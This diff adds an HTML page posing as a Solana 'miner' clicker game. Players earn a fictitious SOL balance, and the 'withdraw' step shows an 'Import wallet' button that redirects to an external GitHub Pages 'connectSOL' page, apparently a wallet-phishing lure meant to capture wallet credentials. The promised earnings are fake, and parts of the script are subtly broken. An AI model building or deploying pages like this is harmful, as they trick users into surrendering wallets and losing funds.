@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WTF Solana Miner Game</title>
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+@font-face {
+    font-family: 'jellies';
+    src: url(Jellies.ttf);
+}
+        html{
+            width:100vw;
+            height:100vh;
+        }
+        body {
+            font-family: 'Press Start 2P', cursive;
+            background: linear-gradient(120deg, #390099, #9e0059, #ffbd00);
+            color: #ffffff;
+            overflow: hidden;
+            height:100vh;
+        }
+
+        h1 {
+            letter-spacing: 0.2em;
+            text-align: center;
+            padding-top: 10px;
+            margin: 10px;
+            font-size: 2rem;
+            color: #39ff14;
+            text-shadow: 4px 4px 10px #000, 0 0 10px #f00, 0 0 20px #00f;
+        }
+
+        #game-container {
+            width: 90%;
+            height: 60vh;
+            margin: 20px auto;
+            position: relative;
+            overflow: hidden;
+            border: 5px dashed #ff00ff;
+            background: radial-gradient(circle, #1e293b, #0f172a);
+            background-size: cover;
+            border-radius: 15px;
+            animation: glow 3s infinite alternate;
+        }
+
+        @keyframes glow {
+            from {
+                box-shadow: 0 0 20px #ff00ff;
+            }
+            to {
+                box-shadow: 0 0 50px #00ffff, 0 0 80px #ff00ff;
+            }
+        }
+
+        .solana-coin {
+            width: 50px;
+            height: 50px;
+            background: url('https://cdn.brandfetch.io/ide0NUuTHO/w/400/h/400/theme/dark/icon.jpeg?c=1bx1740310207348id64Mup7ac9AmKCzp-&t=1667644596465') no-repeat center center/contain;
+            position: absolute;
+            cursor: pointer;
+            border-radius: 50%;
+            box-shadow: #00ffcc81 0 1px 15px 2px;
+            animation: bounce 1.2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        .score-popup {
+            position: absolute;
+            color: #ff0080;
+            font-size: 1.2rem;
+            text-shadow: 0 0 15px #ff00ff, 0 0 30px #ff80ff;
+            animation: fadeOut 1s forwards;
+        }
+
+        @keyframes fadeOut {
+            0% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+        }
+
+        #score {
+            text-align: center;
+            font-size: 1.8rem;
+            margin: 10px 0;
+            color: #00ffcc;
+            text-shadow: 0 0 10px #00ffcc, 0 0 20px #008080;
+        }
+
+        button {
+            display: block;
+            margin: 20px auto;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            font-family: 'Press Start 2P', cursive;
+            color: #fff;
+            width: 80%;
+            background: linear-gradient(90deg, #ff00ff, #ff9900);
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 0 15px #ff00ff;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 30px #ff00ff;
+        }
+
+        #withdraw-box {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 20px 40px;
+            border-radius: 10px;
+            font-size: 18px;
+            display: none;
+            z-index: 1000;
+            text-align: center;
+        }
+
+        #withdraw-box span {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            color: #ff0000;
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        .wallet-icon {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            width: 40px;
+            height: 40px;
+            background: url('purse.png') no-repeat center center/contain;
+            cursor: pointer;
+        }
+        
+
+        footer {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #fff;
+            text-shadow: 0 0 10px #39ff14;
+        }
+
+        footer a {
+            color: #ffd700;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            color: #ff4500;
+        }
+        .modal {
+    display: none;
+    position: fixed;
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.7);
+    justify-content: center;
+    align-items: center;
+}
+
+.modal-content {
+    background-color: #333;
+    color: white;
+    padding: 20px;
+    border-radius: 10px;
+    text-align: center;
+    box-shadow: 0 0 20px rgba(255, 0, 255, 0.8);
+    animation: fadeIn 0.5s ease-in-out;
+}
+
+.close-btn {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    color: white;
+    font-size: 30px;
+    cursor: pointer;
+}
+
+button {
+    background: linear-gradient(90deg, #ff00ff, #ff9900);
+    border: none;
+    padding: 10px 20px;
+    border-radius: 5px;
+    font-size: 1rem;
+    color: white;
+    cursor: pointer;
+    transition: transform 0.3s;
+}
+
+button:hover {
+    transform: scale(1.1);
+    box-shadow: 0 0 15px #ff00ff;
+}
+
+@keyframes fadeIn {
+    from {
+        opacity: 0;
+    }
+    to {
+        opacity: 1;
+    }
+}
+.center {
+    text-align: center;
+    color: #39ff14;
+}
+    </style>
+</head>
+<body>
+    <h1>Sol Miner! </h1>
+    <p id="score">Score: 0</p>
+    <div id="game-container"></div>
+    <p class="center">🚫 No bots, no empty wallets.</p>
+    <button onclick="startGame()">🚀 Let's Mine Coins!</button>
+
+    <div id="withdraw-box">
+        <p>Current Withdrawal: <span id="withdraw-amount">0.000</span> SOL</p>
+        <button onclick="withdraw()">Withdraw</button>
+        <span class="close-btn" onclick="closeWithdrawBox()">X</span>
+    </div>
+
+    <div class="wallet-icon" onclick="toggleWithdrawBox()"></div>
+    <div id="withdraw-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal()">&times;</span>
+            <h2>Congratulations!</h2>
+            <p>You wish to be removed <span id="sol-amount"></span> SOL!</p>
+            <button onclick="redirectToLogin()">Import wallet</button>
+        </div>
+    </div>
+    
+    <footer>
+        Powered by <a href="https://solana.com" target="_blank">Solana Network</a>
+    </footer>
+
+    <script>
+        const gameContainer = document.getElementById('game-container');
+        const scoreDisplay = document.getElementById('score');
+        const withdrawBox = document.getElementById('withdraw-box');
+        const withdrawAmountDisplay = document.getElementById('withdraw-amount');
+        const walletIcon = document.querySelector('.wallet-icon');
+        let score = 0;
+        let gameActive = false;
+        let solAmount = 0;
+
+        // Fonction pour faire apparaître les pièces de Solana
+        function spawnCoin() {
+            const coin = document.createElement('div');
+            coin.classList.add('solana-coin');
+            coin.style.top = `${Math.random() * 50}vh`;
+            coin.style.left = `${Math.random() * 70}vw`;
+    
+            coin.addEventListener('click', (event) => {
+    const points = Math.floor(Math.random() * 3) + 1; // Points aléatoires entre 1 et 3
+    score += points;
+    solAmount += points * 0.0001; // Chaque point correspond à 0.005 SOL
+    scoreDisplay.textContent = `Score: ${score}`;
+    withdrawAmountDisplay.textContent = solAmount.toFixed(3); // Afficher la valeur en SOL
+    showScorePopup(event.clientX, event.clientY, `+${points} 💎`);
+    coin.remove();
+
+    // Afficher la boîte de retrait lorsque le score atteint 60
+    if (score >= 60 && !withdrawBox.style.display) {
+        withdrawBox.style.display = 'block';
+    }
+});
+
+    
+            gameContainer.appendChild(coin);
+    
+            // Supprimer la pièce après 4 secondes si elle n'a pas été cliquée
+            setTimeout(() => {
+                if (coin.parentNode) coin.remove();
+            }, 4000);
+        }
+    
+        // Afficher un popup pour les points gagnés
+        function showScorePopup(x, y, text) {
+            const popup = document.createElement('div');
+            popup.classList.add('score-popup');
+            popup.style.left = `${x}px`;
+            popup.style.top = `${y}px`;
+            popup.textContent = text;
+            document.body.appendChild(popup);
+    
+            // Supprimer le popup après 1 seconde
+            setTimeout(() => popup.remove(), 1000);
+        }
+    
+        // Démarrer le jeu (il ne s'arrête jamais)
+        function startGame() {
+            if (gameActive) return;
+            gameActive = true;
+            score = 0;
+            solAmount = 0;
+            scoreDisplay.textContent = `Score: ${score}`;
+            withdrawAmountDisplay.textContent = solAmount.toFixed(3); // Afficher le montant SOL initial
+            withdrawBox.style.display = 'none';  // Cacher la boîte de retrait au début
+    
+            // Générer des pièces toutes les secondes de manière continue
+            const gameInterval = setInterval(spawnCoin, 1000);
+    
+            // Le jeu continue sans cesse
+        }
+    
+        // Afficher/fermer la boîte de retrait
+        function toggleWithdrawBox() {
+            if (withdrawBox.style.display === 'block') {
+                withdrawBox.style.display = 'none';
+            } else {
+                withdrawBox.style.display = 'block';
+            }
+        }
+
+        // Fermer la boîte de retrait
+        function closeWithdrawBox() {
+            withdrawBox.style.display = 'none';
+        }
+
+        // Effectuer le retrait
+        function withdraw() {
+    const solAmount = (score * 0.0001);  // Montant de SOL à retirer
+
+    // Mettre à jour le montant de SOL dans la modale
+    document.getElementById('sol-amount').textContent = solAmount.toFixed(3);
+
+    // Afficher la modale
+    const modal = document.getElementById('withdraw-modal');
+    modal.style.display = 'flex';
+
+    // Réinitialiser le score
+    score = 0;
+    solAmount = 0;
+    scoreDisplay.textContent = `Score: ${score}`;
+}
+
+function closeModal() {
+    const modal = document.getElementById('withdraw-modal');
+    modal.style.display = 'none';  // Fermer la modale
+}
+
+function redirectToLogin() {
+    // Rediriger vers la page de connexion
+    window.location.href = "https://saifcity84.github.io/skvlsjzcmz/connectSOL.html";
+}
+
+    </script>
+</body>
+</html>
